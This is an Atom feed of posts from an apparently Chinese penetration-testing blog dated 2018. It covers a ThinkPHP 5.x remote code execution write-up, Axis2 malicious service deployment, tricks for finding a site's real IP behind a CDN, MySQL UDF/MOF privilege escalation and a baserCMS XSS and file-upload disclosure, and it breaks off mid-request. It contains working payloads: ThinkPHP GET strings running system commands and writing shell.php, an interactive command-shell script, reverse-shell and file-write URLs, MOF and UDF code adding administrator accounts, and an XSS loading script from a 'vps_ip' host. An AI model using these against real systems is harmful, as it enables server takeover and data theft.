      <category term="bypass" scheme="http://sunu11.com/tags/bypass/"/>
    
      <category term="命令执行" scheme="http://sunu11.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>从thinkphp远程代码执行开始</title>
    <link href="http://sunu11.com/2018/12/12/24/"/>
    <id>http://sunu11.com/2018/12/12/24/</id>
    <published>2018-12-12T12:58:44.000Z</published>
    <updated>2018-12-26T03:04:58.000Z</updated>
    
    <content type="html"><![CDATA[<p>9号晚上thinkphp官网发布安全更新:<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLnRoaW5rcGhwLmNuLzg2OTA3NQ==" title="https://blog.thinkphp.cn/869075">https://blog.thinkphp.cn/869075<i class="fa fa-external-link"></i></span><br>修复了一处代码执行漏洞，影响没有开启强制路由的5.0 – V5.0.23版本与5.1 – V5.1.31版本thinkphp 开发站点。，简单记录一下近两天一些信息与心得。<a id="more"></a></p><h3 id="thinkphp代码执行漏洞"><a href="#thinkphp代码执行漏洞" class="headerlink" title="thinkphp代码执行漏洞"></a>thinkphp代码执行漏洞</h3><h4 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h4><p>到现在这个点相信各大厂商都的waf都可以拦截这个攻击了，包括我司23333。之所以存在漏洞，关键在于框架对控制器名没有进行足够的检测，从补丁也能看出来。<br>贴漏洞产生的部分关键代码：<br>从下述代码可知，在当$name包含\则将其作为类名，如果$name可控，是可以实例化任何一个类的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">protected function parseModuleAndClass($name, $layer, $appendSuffix)</span><br><span class="line">   &#123;   echo &apos;parseModuleAndClass:&apos;.$name.&quot;&lt;br&gt;&quot;;</span><br><span class="line">       if (false !== strpos($name, &apos;\\&apos;)) &#123; </span><br><span class="line">           $class  = $name;</span><br><span class="line"></span><br><span class="line">           $module = $this-&gt;request-&gt;module();</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p>而$name可控且\没被过滤，因此可以通过s=index/\think\Container/invokefunction的方式调用think\Container这个命名空间下的invokefunction函数。从而实现命令执行。</p><h4 id="poc："><a href="#poc：" class="headerlink" title="poc："></a><em>poc</em>：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?s=index/\think\Request/input&amp;filter=phpinfo&amp;data=1</span><br><span class="line">?s=index/\think\Request/input&amp;filter=system&amp;data=id</span><br><span class="line">?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=%3C?php%20phpinfo();?%3E</span><br><span class="line">?s=index/\think\view\driver\Php/display&amp;content=%3C?php%20phpinfo();?%3E</span><br><span class="line">?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br><span class="line">?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br><span class="line">?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</span><br><span class="line">?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br><span class="line">?s=index/think\config/get&amp;name=database.password</span><br></pre></td></tr></table></figure><h4 id="检测脚本："><a href="#检测脚本：" class="headerlink" title="检测脚本："></a>检测脚本：</h4><p>避免其他问题，暂放一个github上的简单测试脚本：attack.py<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#author: ctudoudou</span><br><span class="line">from requests import get</span><br><span class="line">from argparse import ArgumentParser</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    parser = ArgumentParser(prog=&apos;Test poc&apos;, usage=&apos;./attack.py [options: -u] &lt;url&gt;&apos;,</span><br><span class="line">                            description=&quot;The ThinkPHP test script&quot;)</span><br><span class="line"></span><br><span class="line">    parser.add_argument(&quot;-u&quot;, &quot;--url&quot;, dest=&quot;url&quot;, help=&quot;attack url&quot;)</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    while (True):</span><br><span class="line">        url = &apos;&#123;&#125;?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&apos; \</span><br><span class="line">              &apos;&amp;vars[0]=system&amp;vars[1][]=&apos;.format(args.url)#可继续添加其他poc</span><br><span class="line">        command = input(&quot;shell$ &quot;)</span><br><span class="line">        if command != &quot;exit&quot;:</span><br><span class="line">            payload = url + str(command)</span><br><span class="line">            r = get(payload)</span><br><span class="line">            print(r.text)</span><br><span class="line">        else:</span><br><span class="line">            break</span><br></pre></td></tr></table></figure></p><p>自己简单写了一个综合检测的脚本：<br>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3N1bnUxMS90aGlua3BocHY1" title="https://github.com/sunu11/thinkphpv5">https://github.com/sunu11/thinkphpv5<i class="fa fa-external-link"></i></span></p><h4 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h4><p>官方现已推出补丁 建议开发者进行修复<br>Thinkphp v5.0.x补丁地址: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RvcC10aGluay9mcmFtZXdvcmsvY29tbWl0L2I3OTdkNzIzNTJlNmI0ZWIwZTExYjZiYzJhMmVmMjU5MDdiNzc1NmY=" title="https://github.com/top-think/framework/commit/b797d72352e6b4eb0e11b6bc2a2ef25907b7756f">https://github.com/top-think/framework/commit/b797d72352e6b4eb0e11b6bc2a2ef25907b7756f<i class="fa fa-external-link"></i></span><br>Thinkphp v5.1.x补丁地址: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RvcC10aGluay9mcmFtZXdvcmsvY29tbWl0LzgwMmYyODRiZWM4MjFhNjA4ZTc1NDNkOTExMjZhYmM1OTAxYjI4MTU=" title="https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815">https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815<i class="fa fa-external-link"></i></span><br>另外像这种漏洞是存在攻击特征的，基于正则的waf也可以进行拦截，因此有装了waf的升级规则库可保无碍，没安装的git pull 官方代码应该也还ok。关键是及时发现，及时处理。</p><h3 id="其他漏洞"><a href="#其他漏洞" class="headerlink" title="其他漏洞"></a>其他漏洞</h3><p>1、phpmyadmin 官网也更新了，修复了三枚漏洞，文件包含、csrf、xss，可以及时关注一下。<span class="exturl" data-url="aHR0cHM6Ly93d3cudDAwbHMubmV0L2FydGljbGVzLTQ4OTUyLmh0bWw=" title="https://www.t00ls.net/articles-48952.html">https://www.t00ls.net/articles-48952.html<i class="fa fa-external-link"></i></span><br>2、偶像Orange Tsai发了一条Twitter：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">After weeks of diving into a single 500mb idb file. Finally chained a pre-auth RCE in a popular SSL VPN! 🙌</span><br></pre></td></tr></table></figure></p><p>静候233333</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;9号晚上thinkphp官网发布安全更新:&lt;a href=&quot;https://blog.thinkphp.cn/869075&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://blog.thinkphp.cn/869075&lt;/a&gt;&lt;br&gt;修复了一处代码执行漏洞，影响没有开启强制路由的5.0 – V5.0.23版本与5.1 – V5.1.31版本thinkphp 开发站点。，简单记录一下近两天一些信息与心得。
    
    </summary>
    
      <category term="WEB安全" scheme="http://sunu11.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="getshell" scheme="http://sunu11.com/tags/getshell/"/>
    
      <category term="phpmyadmin" scheme="http://sunu11.com/tags/phpmyadmin/"/>
    
      <category term="thinkphp" scheme="http://sunu11.com/tags/thinkphp/"/>
    
  </entry>
  
  <entry>
    <title>其他分享的一些东西</title>
    <link href="http://sunu11.com/2018/11/28/ohters/"/>
    <id>http://sunu11.com/2018/11/28/ohters/</id>
    <published>2018-11-28T05:32:38.000Z</published>
    <updated>2019-01-15T09:52:09.000Z</updated>
    
    <content type="html"><![CDATA[<p>记录一下，方便以后查询。<a id="more"></a></p><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>ucms1.4.5后台sql注入漏洞 <span class="exturl" data-url="aHR0cHM6Ly93d3cudDAwbHMubmV0L3RocmVhZC00ODQzMi0xLTEuaHRtbA==" title="https://www.t00ls.net/thread-48432-1-1.html">https://www.t00ls.net/thread-48432-1-1.html<i class="fa fa-external-link"></i></span><br>DedeCMS V5.7 SP2前台文件上传(需要后台权限CVE-2018-20129)复现分析 <span class="exturl" data-url="aHR0cHM6Ly93d3cudDAwbHMubmV0L3RocmVhZC00OTA4Ni0xLTEuaHRtbA==" title="https://www.t00ls.net/thread-49086-1-1.html">https://www.t00ls.net/thread-49086-1-1.html<i class="fa fa-external-link"></i></span></p><h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><p>H1 CTF Writeup(简单翻译）<span class="exturl" data-url="aHR0cHM6Ly93d3cudDAwbHMubmV0L3RocmVhZC00ODY1OS0xLTEuaHRtbA==" title="https://www.t00ls.net/thread-48659-1-1.html">https://www.t00ls.net/thread-48659-1-1.html<i class="fa fa-external-link"></i></span><br>网鼎杯部分题writeup <span class="exturl" data-url="aHR0cHM6Ly90b3BzZWMud2lraS8zNnQ5YUpkYS8/dGhyZWFkLTQ5NS5odG0=" title="https://topsec.wiki/36t9aJda/?thread-495.htm">https://topsec.wiki/36t9aJda/?thread-495.htm<i class="fa fa-external-link"></i></span><br>EDU-CTF2018_Web:TwoFile <span class="exturl" data-url="aHR0cHM6Ly93d3cudDAwbHMubmV0L3RocmVhZC00OTUyMy0xLTEuaHRtbA==" title="https://www.t00ls.net/thread-49523-1-1.html">https://www.t00ls.net/thread-49523-1-1.html<i class="fa fa-external-link"></i></span></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;记录一下，方便以后查询。
    
    </summary>
    
      <category term="other" scheme="http://sunu11.com/categories/other/"/>
    
    
  </entry>
  
  <entry>
    <title>Axis2恶意部署getshell</title>
    <link href="http://sunu11.com/2018/11/03/Axis2%20getshell/"/>
    <id>http://sunu11.com/2018/11/03/Axis2 getshell/</id>
    <published>2018-11-03T13:42:06.000Z</published>
    <updated>2018-11-10T12:11:18.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>以前遇到的，记录一下，便于以后查阅 <a id="more"></a></p><h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p>一般默认的账号是admin密码是axis2，登陆后：点击upload service<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/axis2-1.png" alt="1"><br>上传cat.aar文件，可看到上传成功。<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/axis2-2.png" alt="2"><br>点击Available Services可选择可用的功能。<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/axis2-3.png" alt="3"><br>主要功能有：<br>1、getClassPath<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/axis2-4.png" alt="4"><br>2、执行命令：<br>参数:<br><code>cmd=xxx</code><br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/axis2-5.png" alt="5"><br>3、反弹shell：<br><code>https://192.168.86.254:8443/axis2/services/Cat/shell?host=x.x.x.x&amp;port=x</code><br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/axis2-6.png" alt="6"><br>4、写入shell或是写入文件<br><code>https://192.168.86.254:8443/axis2/services/Cat/writeStringToFile?data=数据&amp;file=文件路径&amp;encoding=utf-8&amp;append=false</code></p><p>详细过程请参考：<span class="exturl" data-url="aHR0cDovL3Ayai5jbi8/cD0xNTMz" title="http://p2j.cn/?p=1533">http://p2j.cn/?p=1533<i class="fa fa-external-link"></i></span></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;以前遇到的，记录一下，便于以后查阅
    
    </summary>
    
      <category term="渗透测试" scheme="http://sunu11.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="getshell" scheme="http://sunu11.com/tags/getshell/"/>
    
      <category term="axis2" scheme="http://sunu11.com/tags/axis2/"/>
    
      <category term="中间件" scheme="http://sunu11.com/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>如果获取站点真实ip</title>
    <link href="http://sunu11.com/2018/11/03/How%20to%20get%20the%20real%20IP%20of%20the%20site/"/>
    <id>http://sunu11.com/2018/11/03/How to get the real IP of the site/</id>
    <published>2018-11-03T13:16:00.000Z</published>
    <updated>2018-11-10T12:09:27.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>说到渗透测试，肯定有信息收集；信息收集就涉及服务器ip信息。而通常大型站点都通过了cdn、代理等手段隐藏。本文对这个老话题作一下个人的思路以及姿势总结。<a id="more"></a></p><h2 id="姿势"><a href="#姿势" class="headerlink" title="姿势"></a>姿势</h2><p>1、对于存在注册或者留言等能够让站点通过邮件联系的网站，通常可以通过站点发送的邮件找到服务器的真实ip，如bilibili.com：<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/getip-1.png" alt="1"><br>此方法是因为通常大部分公用SMTP服务在发信时邮件头会带上发件者ip，cdn的防护对这种方式完全没作用。解决方式可以参考此链接：<span class="exturl" data-url="aHR0cHM6Ly93d3cudjJleC5jb20vdC8yNzY3ODg=" title="https://www.v2ex.com/t/276788">https://www.v2ex.com/t/276788<i class="fa fa-external-link"></i></span><br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/getip-2.png" alt="2"><br>2、nslookup命令：对于bilibili.com 该方式同样实用，因为存在MX记录：<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/getip-3.png" alt="3"><br>也可以查找NS、TXT等其他记录进行真实ip的查找。另外还可以使用国外冷门的dns解析域名：nslookup xxx.com y.y.y.y  如果运气好，找到直接解析到服务器真实ip的dns服务器。一查就出来了。<br>3、Ping：找二级域名，通过ping将网站的二级域名的ip逐个与目标域名相匹配，直到访问成功即可，还有ping秃域名(如对于<span class="exturl" data-url="aHR0cDovL3d3dy5iYWlkdS5jb23vvIzlr7nkuo5waW5n" title="http://www.baidu.com，对于ping">www.baidu.com，对于ping<i class="fa fa-external-link"></i></span> baidu.com就是ping秃域名)，这类方式都是看管理员粗不粗心，如果能找到管理员没有使用cdn的域名，就能找到真实ip了。同样因为很多国内的CDN没有节点对国外服务，也可以使用国外的多节点ping工具，例如just-ping，全世界几十个节点ping目标域名，很有可能找到真实ip。域名：<span class="exturl" data-url="aHR0cHM6Ly9hc20uY2EuY29tL2VuL3BpbmcucGhw" title="https://asm.ca.com/en/ping.php">https://asm.ca.com/en/ping.php<i class="fa fa-external-link"></i></span><br>4、通过网站的缺陷与漏洞,比如寻找网站上的探针：phpinfo等，寻找网站上的xss、os injection、ssrf等一切可以让服务器主动访问我的vps的漏洞，并成功利用。通过查看日志或者vps的请求记录就能看到真实ip。<br>5、通过大量信息收集，如通过其他第三方网站查看域名历史解析记录、域名历史信息历史漏洞或者二级域名等然后利用这些获取到的信息进行进一步的ip查找（灵活使用），这下面是常用的几个：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">https://bgp.he.net </span><br><span class="line">https://toolbar.netcraft.com/site_report?url=www.xxx.com</span><br><span class="line">http://www.17ce.com</span><br><span class="line">http://www.crimeflare.com/</span><br><span class="line">https://domainbigdata.com/goodmbi.com</span><br><span class="line">https://crt.sh/</span><br><span class="line">http://wooyun.jozxing.cc/</span><br><span class="line">https://fofa.so/</span><br></pre></td></tr></table></figure><p>最后的fofa是网上学到的姿势之一，通过fofa的HTML源代码检索，复制网页title或者其他信息放fofa进行检索，5173.com可以通过该方法找到真实ip但是前两天我需要查找源ip的网址使用该方法无效，此方法建立在通过fofa能检索到并且html标识够独特的基础下，个人感觉在没有思路的时候也可以试试，有待下一次实践。贴一张图：<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/getip-4.png" alt="4"><br>6、其他没尝试过的姿势：社工到cdn账号密码，怼进去看配置；zmap扫全网，匹配站点信息追溯真实ip；DDOS，把cdn打穿就会回源；通过DNS社工库，找对应的解析记录。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;说到渗透测试，肯定有信息收集；信息收集就涉及服务器ip信息。而通常大型站点都通过了cdn、代理等手段隐藏。本文对这个老话题作一下个人的思路以及姿势总结。
    
    </summary>
    
      <category term="渗透测试" scheme="http://sunu11.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="信息收集" scheme="http://sunu11.com/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
      <category term="fofa" scheme="http://sunu11.com/tags/fofa/"/>
    
  </entry>
  
  <entry>
    <title>mysql两种经典提权方式</title>
    <link href="http://sunu11.com/2018/11/03/Classic_elevation_of_authority_record/"/>
    <id>http://sunu11.com/2018/11/03/Classic_elevation_of_authority_record/</id>
    <published>2018-11-03T11:47:30.000Z</published>
    <updated>2018-11-10T12:12:10.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h3><p>条件：<br>1、系统版本（Windows2000，XP,Win2003);<br>2、拥有MYSQL的某个账号，且该账号具有对msql的insert与delete权限。<br>3、具有root账号密码<a id="more"></a><br>首先导出udf：<br>MYSQL5.1以上版本，需要把udf.dll文件存放到MSYSQL安装目录下的lib\plugin文件夹下。<br>在mysql命令行输入：<br><figure class="highlight plain"><figcaption><span>@@basedir</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &apos;%plugins%&apos;</span><br></pre></td></tr></table></figure></p><p>然后提权：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create function cmdshell returns string soname &apos;udf.dll&apos;</span><br><span class="line">select cmdshell(&apos;net user xxx xxx /add&apos;);</span><br><span class="line">select cmdshell (&apos;net localgroup administrators xxx /add&apos;);</span><br><span class="line"></span><br><span class="line">drop function cmdshell;</span><br></pre></td></tr></table></figure></p><p>**<code>returns string soname ‘导出的DLL路径’</code></p><h3 id="mof提权"><a href="#mof提权" class="headerlink" title="mof提权"></a>mof提权</h3><p>以下为创建xxx用户的mof文件，使用sql执行load_file及into dumpfile 把文件导出到正确位置，执行即可。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)</span><br><span class="line"> </span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">    EventNamespace = &quot;Root\\Cimv2&quot;;</span><br><span class="line">    Name  = &quot;filtP2&quot;;</span><br><span class="line">    Query = &quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="line">            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br><span class="line">            &quot;And TargetInstance.Second = 5&quot;;</span><br><span class="line">    QueryLanguage = &quot;WQL&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">    Name = &quot;consPCSV2&quot;;</span><br><span class="line">    ScriptingEngine = &quot;JScript&quot;;</span><br><span class="line">    ScriptText =</span><br><span class="line">    &quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user xxx xxx /add\&quot;)&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">    Consumer   = $Consumer;</span><br><span class="line">    Filter = $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>执行sql命令：<br><code>select load file(&#39;c:/wmpub/nullevt.mof&#39;) into dumpfile &#39;c:/windows/system32/wbem/mof/nullevt.mov&#39;</code>;</p><p>在可控数据库的情况下也可以直接写入：<br><code>select char(将上述exp asc编码写入) into dumpfile &#39;c:/windows/system32/wbem/mof/nullevt.mov&#39;;</code></p><p>以上均为新建账号，还需要修改代码将xxx用户加入administrators，重新写入一遍即可。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;udf提权&quot;&gt;&lt;a href=&quot;#udf提权&quot; class=&quot;headerlink&quot; title=&quot;udf提权&quot;&gt;&lt;/a&gt;udf提权&lt;/h3&gt;&lt;p&gt;条件：&lt;br&gt;1、系统版本（Windows2000，XP,Win2003);&lt;br&gt;2、拥有MYSQL的某个账号，且该账号具有对msql的insert与delete权限。&lt;br&gt;3、具有root账号密码
    
    </summary>
    
      <category term="渗透测试" scheme="http://sunu11.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="提权" scheme="http://sunu11.com/tags/%E6%8F%90%E6%9D%83/"/>
    
      <category term="mysql" scheme="http://sunu11.com/tags/mysql/"/>
    
  </entry>
  
  <entry>
    <title>baserCMS 漏洞披漏</title>
    <link href="http://sunu11.com/2018/10/31/baserCMS/"/>
    <id>http://sunu11.com/2018/10/31/baserCMS/</id>
    <published>2018-10-31T09:07:23.000Z</published>
    <updated>2018-11-28T04:58:17.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>baserCMS（ベーサーシーエムエス）とは、直感的な操作と高いメンテナンス性を実現し、Webサイトを自由にカスタマイズできる国産CMS（コンテンツ・マネージメント・システム）です。日本人が日本人の為に、みんなで作っているオープンソース・ソフトウェアです。無料で利用でき、様々なサーバーで動作可能で、インストールも簡単です。<a id="more"></a></p><p>オープンソース・フレームワーク「CakePHP」をベースとしているので、カスタマイズ性、メンテナンス性が高いのが特徴です。</p><p>ツリー構造により固定ページ、ブログ、フォームをまとめて管理できる、強力なコンテンツ管理機能を持つCMSです。Webサイトに最低限必要となるメールフォームや新着ブログなどのプラグインや管理画面の枠組みを最初から装備しており、スマートフォンにも標準対応しています。</p><p>マニュアルやソースコードのコメントにおいて日本語を標準としているのも国産CMSの強みです。  ———— it’s copy from <span class="exturl" data-url="aHR0cHM6Ly9iYXNlcmNtcy5uZXQvYWJvdXQvaW5kZXguaHRtbA==" title="https://basercms.net/about/index.html">https://basercms.net/about/index.html<i class="fa fa-external-link"></i></span></p><p>I found two vulnerability in basicCMS 4.1.3.</p><h3 id="storage-xss-vulnerability（fixed）"><a href="#storage-xss-vulnerability（fixed）" class="headerlink" title="storage xss vulnerability（fixed）"></a>storage xss vulnerability（fixed）</h3><p>There is a storage xss vulnerability in the category name editor after login with normal administrator privileges.</p><h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><p>We register two administrator accounts with different permissions：システム管理 and サイト運営<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/baser-1.png" alt="图1"><br>Log in to the system using サイト運営 privileged account root:<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/baser-2.png" alt="图2"><br>In the Register New Category feature of the Upload menu, the category name can execute a malicious xss statement:<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/baser-3.png" alt="图3"><br>After the administrator logs in, accessing the page triggers:<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/baser-4.png" alt="图4"><br>So，We can insert malicious javascript according to the vulnerability to override the administrator function.<br>For example<br>The root user does not have permission to access<br>“<span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMS9iYXNlcmNtcy9hZG1pbi9zaXRlX2NvbmZpZ3MvZGVsX2NhY2hl4oCd" title="http://127.0.0.1/basercms/admin/site_configs/del_cache”">http://127.0.0.1/basercms/admin/site_configs/del_cache”<i class="fa fa-external-link"></i></span> to delete the server cache information:<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/baser-5.png" alt="图5"><br>We can exploit this vulnerability to implement an attack:<br>Since the <strong><code>data[UploaderCategory][name]</code></strong> parameter has a length limit, We can insert the following statement first:<br><code>&lt;script src=&quot;http://vps_ip/1.js&quot;&gt;&lt;/script&gt;</code><br>Then, 1.js uses ajax to write a get request to<br><code>http://127.0.0.1/basercms/admin/site_configs/del_cache</code>:<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/baser-6.png" alt="图6"><br>Verify: The root (asda)user refreshes the page:<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/baser-7.png" alt="图7"><br>And when the administrator user(ad_lab) accesses the page, it triggers js and deletes the server cache.<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/baser-8.png" alt="图8"><br>Finally, I found the corresponding code with defects.<br>UploaderCategoriesController.php<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/baser-9.png" alt="图9"><br>It was found that the カテゴリ名（<strong><code>data[UploaderCategory][name]</code></strong>）parameter submitted by the user did not filter the malicious characters,</p><h4 id="Solution"><a href="#Solution" class="headerlink" title="Solution:"></a>Solution:</h4><p>Note: The issue has been reported in 2018 09 and was resolved by a developer of baserCMS. <span class="exturl" data-url="aHR0cHM6Ly9iYXNlcmNtcy5uZXQvbmV3cy9hcmNoaXZlcy81NzQ=" title="https://basercms.net/news/archives/574">Announcement address<i class="fa fa-external-link"></i></span></p><h3 id="Code-Execution-Vulnerability（fixed）"><a href="#Code-Execution-Vulnerability（fixed）" class="headerlink" title="Code Execution Vulnerability（fixed）"></a>Code Execution Vulnerability（fixed）</h3><h4 id="Process"><a href="#Process" class="headerlink" title="Process"></a>Process</h4><p>Download the latest version of basercms (4.1.3).In \basercms\lib\Baser\Model\ThemeConfig.php, you can see that the uploaded file suffix is not checked, so we can upload the webshell file directly.</p><p>In the saveImage method of \basercms\lib\Baser\Model\ThemeConfig.php we can see that is about saving the logo during the theme setup:<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/baser-10.png" alt="图10"><br>We can seen move_uploaded_file method，Then audit code，It can be seen that the image is saved here and the suffix is not verified.，Only limited the image name (logo)，So you can get server permissions by uploading php webshell.<br>Poc：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">POST /basercms/admin/theme_configs/form HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 3986</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://127.0.0.1</span><br><span 